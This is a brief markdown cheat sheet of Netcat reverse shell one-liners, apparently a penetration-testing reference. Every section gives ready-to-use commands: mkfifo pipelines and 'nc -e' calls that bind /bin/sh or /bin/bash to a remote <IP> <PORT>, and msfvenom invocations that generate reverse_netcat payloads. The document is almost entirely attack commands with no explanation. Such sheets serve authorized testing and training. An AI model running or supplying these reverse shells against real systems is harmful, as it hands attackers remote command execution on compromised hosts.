# Netcat

## 01 - One-liners

### 1.1 - OpenBSD Method

```
$ mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f; rm /tmp/f

$ mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f; rm /tmp/f
```

### 1.2 - Traditional GNU Method

```
$ nc -e /bin/sh <IP> <PORT>

$ nc -e /bin/bash <IP> <PORT>
```

## 02 - Generate via `msfvenom`

### 2.1 - OpenBSD Method

```
$ msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<PORT>
```

### 2.2 - Traditional GNU Method

```
$ msfvenom -p cmd/unix/reverse_netcat_gaping lhost=<IP> lport=<PORT>

$ msfvenom -p cmd/unix/pingback_reverse lhost=<IP> lport=<PORT>
```

---
## References

- [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)

- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)